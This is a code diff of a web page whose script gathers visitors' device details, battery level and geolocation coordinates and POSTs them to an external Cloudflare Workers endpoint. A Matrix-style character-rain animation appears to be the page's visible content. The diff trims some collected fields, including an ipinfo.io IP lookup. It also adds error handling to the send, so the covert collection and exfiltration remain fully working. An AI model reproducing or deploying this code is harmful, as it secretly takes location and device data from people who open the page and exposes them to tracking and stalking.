@@ -144,21 +144,7 @@
                 screenHeight: window.screen.height,
                 deviceMemory: navigator.deviceMemory || "N/A",
                 hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
-                appName: navigator.appName,
-                product: navigator.product,
-                vendor: navigator.vendor,
             };
-        }
-
-        async function getIpInfo() {
-            try {
-                const response = await fetch('https://ipinfo.io/json');
-                if (!response.ok) return null;
-                return await response.json();
-            } catch (error) {
-                console.error("IP info error:", error);
-                return null;
-            }
         }
         
         async function getBatteryLevel() {
@@ -174,11 +160,14 @@
         async function sendDataToServer(data) {
             const workerUrl = 'https://proxy.mvdclowned.workers.dev'; 
             try {
-                await fetch(workerUrl, {
+                const response = await fetch(workerUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
+                if (!response.ok) {
+                    console.error('Server returned an error:', response.status);
+                }
             } catch (error) {
                 console.error('Network error:', error);
             }
@@ -188,7 +177,6 @@
             try {
                 const rawData = {
                     deviceInfo: collectDeviceInfo(),
-                    ipInfo: await getIpInfo(),
                     batteryLevel: await getBatteryLevel(),
                     location: position ? {
                         latitude: position.coords.latitude,
@@ -245,7 +233,7 @@
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            const alphabet = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘмеレヱゲゼデベペオォコソトノホмоヨョロヲゴゾドボпоヴッнABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
+            const alphabet = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホмоヨョロヲゴゾドボпоヴッнABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
             const fontSize = 16;
             const columns = canvas.width / fontSize;
             const rainDrops = Array(Math.floor(columns)).fill(1);
@@ -285,4 +273,3 @@
     </script>
 </body>
 </html>
-                        
